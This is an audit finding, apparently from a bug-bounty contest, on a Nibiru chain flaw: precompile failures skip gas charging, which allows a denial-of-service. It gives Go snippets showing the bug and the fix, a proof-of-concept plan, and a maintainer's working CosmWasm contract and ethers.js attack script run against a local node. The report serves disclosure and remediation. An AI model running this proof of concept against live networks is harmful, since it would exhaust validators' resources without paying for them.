# Nibiru C4 H-04: Gas is not consumed when precompile method fails, allowing resource-consumption DoS

- Source bundle: `report.md`
- Contest: `2024-11-nibiru`
- Contest start: `2024-11-12`
- Contest end: `2024-11-26`
- Original severity: `High`
- Corpus ID: `nibiru-c4-2024-11-h04-failed-precompile-gas-bypass`

---

## [[H-04] Gas is not consumed when precompile method fail, allowing resource consumption related DOS](https://github.com/code-423n4/2024-11-nibiru-findings/issues/25)
*Submitted by [0x007](https://github.com/code-423n4/2024-11-nibiru-findings/issues/25)*

<https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/funtoken.go#L79-L84> 

<https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/wasm.go#L71-L79> 

<https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/precompile/oracle.go#L60-L64>

### Finding description and impact

When a precompile method fails (e.g., due to an error), **gas is not consumed** as the method returns early before invoking the gas consumption logic. This issue affects all three precompiles in the system:

- FunToken
- Wasm
- Oracle

The lack of gas consumption on failure allows attackers to perform denial-of-service (DoS) attacks by exploiting the failure conditions to consume excessive resources without paying for them. The code snippet below demonstrates the issue:

```go
if err != nil {
    return nil, err
}

// Gas consumed by a local gas meter
contract.UseGas(startResult.CacheCtx.GasMeter().GasConsumed())
```

### Impact:

1. **Resource Consumption without Gas Payment:** Since gas is not consumed on failure, an attacker can repeatedly trigger precompile failures, consuming large amounts of resources without the associated cost.
2. **Potential DoS Attack:** This can lead to a DoS attack, where an attacker fills the block with failed precompile executions, causing network slowdowns, failures, or even halting the chain.
3. **Block Gas Limit Exploitation:** Before the `precompile.Run` method is called, a small amount of `requiredGas` is consumed. However, once this is consumed, attackers can continue to use gas at no cost, potentially exhausting the block gas limit.

### Proof of Concept

1. **Create an EVM Contract:** Design an EVM contract that calls the `wasm.execute` function repeatedly, up to the `maxMultistoreCacheCount` (10) times.
2. **Trigger the DoS:** Call the contract with a transaction that uses a large amount of gas limit.
3. **Exploit the Failure:** In the `wasm.execute` function, consume almost all of the available gas and then revert the transaction. This will allow the attacker to consume gas without paying for it, leveraging the bug in the precompile failure handling.

### Recommended mitigation steps

Use gas before returning the `err`:

```go
// Gas consumed by a local gas meter
contract.UseGas(startResult.CacheCtx.GasMeter().GasConsumed())

if err != nil {
    return nil, err
}
```

**[onikonychev (Nibiru) commented](https://github.com/code-423n4/2024-11-nibiru-findings/issues/25#issuecomment-2560168760):**
 > Moving `contract.UseGas()` before the error handling does not make sense. See the reasons below:
> 
> 1. User must specify a gas limit when sending an Ethereum tx.
> 2. Before precompile execution, an isolated gas meter is created with the specified gas limit.
> 3. If, during the execution (could be in the beginning or in the middle), gas consumption exceeds the user-specified gas limit, the gas meter throws an `OutOfGas` exception and reverts the transaction.
> 4. In case of transaction failure (as well as success), the user pays almost 100% of the gas specified in the transaction. This is done to encourage users to be more accurate and to call `EstimateGas()` before execution. There is a potential 20% refund (see [here](https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/keeper/msg_server.go#L359-L374)), but this is not a significant factor.
> 5. Therefore, a potential attacker WILL still pay gas regardless of whether the transaction succeeds or reverts.

**[berndartmueller (judge) commented](https://github.com/code-423n4/2024-11-nibiru-findings/issues/25#issuecomment-2572592732):**
 > @onikonychev - due to not consuming the precompile gas in the case of an error, a user can repeatedly call the precompile, have it purposefully error and thus consume more computational resources than the user would be eligible for with the paid gas.

**[k-yang (Nibiru) confirmed and commented](https://github.com/code-423n4/2024-11-nibiru-findings/issues/25#issuecomment-2578344564):**
 > Agree it's a valid issue. Here's a wasm contract that demonstrates it:
> 
> ```rust
> use cosmwasm_std::{
>     entry_point, to_json_binary, Binary, Deps, DepsMut, Env, MessageInfo, Response, StdError,
>     StdResult,
> };
> use cw2::set_contract_version;
> 
> use crate::error::ContractError;
> use crate::msg::{ExecuteMsg, InstantiateMsg, QueryMsg};
> 
> // version info for migration info
> const CONTRACT_NAME: &str = "crates.io:counter";
> const CONTRACT_VERSION: &str = env!("CARGO_PKG_VERSION");
> 
> #[cfg_attr(not(feature = "library"), entry_point)]
> pub fn instantiate(
>     deps: DepsMut,
>     _env: Env,
>     info: MessageInfo,
>     _msg: InstantiateMsg,
> ) -> Result<Response, ContractError> {
>     set_contract_version(deps.storage, CONTRACT_NAME, CONTRACT_VERSION)?;
> 
>     Ok(Response::new()
>         .add_attribute("method", "instantiate")
>         .add_attribute("owner", info.sender))
> }
> 
> #[cfg_attr(not(feature = "library"), entry_point)]
> pub fn execute(
>     _deps: DepsMut,
>     _env: Env,
>     _info: MessageInfo,
>     msg: ExecuteMsg,
> ) -> Result<Response, ContractError> {
>     match msg {
>         ExecuteMsg::WasteGas {} => Err(ContractError::Std(StdError::generic_err(
>             "arbitrary revert".to_string(),
>         ))),
>         ExecuteMsg::NoGas {} => Ok(Response::new().add_attribute("method", "no_gas")),
>     }
> }
> 
> // ./msg.rs
> use cosmwasm_schema::{cw_serde};
> 
> #[cw_serde]
> pub struct InstantiateMsg {}
> 
> #[cw_serde]
> pub enum ExecuteMsg {
>     WasteGas {},
>     NoGas {},
> }
> ```
> 
> And here's a script that executes the wasteful gas scenario:
> 
> ```ts
> import { HDNodeWallet, JsonRpcProvider, toUtf8Bytes } from "ethers";
> import { WastefulGas__factory } from "../../typechain-types";
> 
> // connects to local node
> const jsonRpcProvider = new JsonRpcProvider("http://localhost:8545");
> 
> // mnemonic for the HD wallet
> const mnemonic = "..."
> const owner = HDNodeWallet.fromPhrase(mnemonic, "", "m/44'/118'/0'/0/0").connect(jsonRpcProvider)
> 
> const WASM_CONTRACT_ADDR = process.argv[2];
> 
> async function main() {
>   // deploy contract
>   const factory = new WastefulGas__factory(owner);
>   const attackContract = await factory.deploy();
>   await attackContract.waitForDeployment();
>   console.log("contract address: ", await attackContract.getAddress())
> 
>   const msgBzNoGas = toUtf8Bytes(JSON.stringify({
>     "no_gas": {},
>   }));
> 
>   // call attack
>   const txNoGas = await attackContract.attack(WASM_CONTRACT_ADDR, msgBzNoGas, { gasLimit: "200000" });
>   const receiptNoGas = await txNoGas.wait();
>   console.log("receiptNoGas: ", receiptNoGas);
> 
> 
>   const msgBzWasteGas = toUtf8Bytes(JSON.stringify({
>     "waste_gas": {
>       "gas_limit": 0,
>     },
>   }));
>   // call attack
>   const txWasteGas = await attackContract.attack(WASM_CONTRACT_ADDR, msgBzWasteGas, { gasLimit: "200000" });
>   const receiptWasteGas = await txWasteGas.wait();
>   console.log("receiptWasteGas: ", receiptWasteGas);
> }
> 
> main();
> ```
> 
> The two attacks should consume the same amount of gas, but the one that errors consumes considerably less gas.

**Nibiru mitigated:**
> [PR-2152](https://github.com/NibiruChain/nibiru/pull/2152) - Consume gas before returning error.

**Status:** Mitigation confirmed. 

***
